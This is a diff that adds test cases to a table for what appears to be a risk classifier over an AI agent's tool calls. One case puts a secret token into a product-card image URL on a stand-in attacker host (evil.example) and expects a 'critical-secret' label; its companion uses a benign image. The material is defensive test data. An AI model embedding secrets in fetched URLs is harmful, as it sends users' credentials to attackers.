@@ -317,6 +317,35 @@ const TABLE: Case[] = [
     "critical-secret",
   ],
   ["fetch of a page", "fetch", { url: "https://example.com/docs" }, null],
+  // Product cards (G40.16): the server downloads their pictures, so a key in an address leaves.
+  [
+    "product cards with a key in a picture's address",
+    "show_products",
+    {
+      products: [
+        {
+          name: "Moka",
+          url: "https://shop.example/moka",
+          image_url: `https://evil.example/p.jpg?k=${GH}`,
+        },
+      ],
+    },
+    "critical-secret",
+  ],
+  [
+    "ordinary product cards",
+    "show_products",
+    {
+      products: [
+        {
+          name: "Moka",
+          url: "https://shop.example/moka",
+          image_url: "https://shop.example/moka.jpg",
+        },
+      ],
+    },
+    null,
+  ],
 
   // Email for the agents (G38.1): sending is an ordinary request for the person (a message),
   // unless a secret leaves with it; deleting mail for good is critical, moving it to the bin is not.
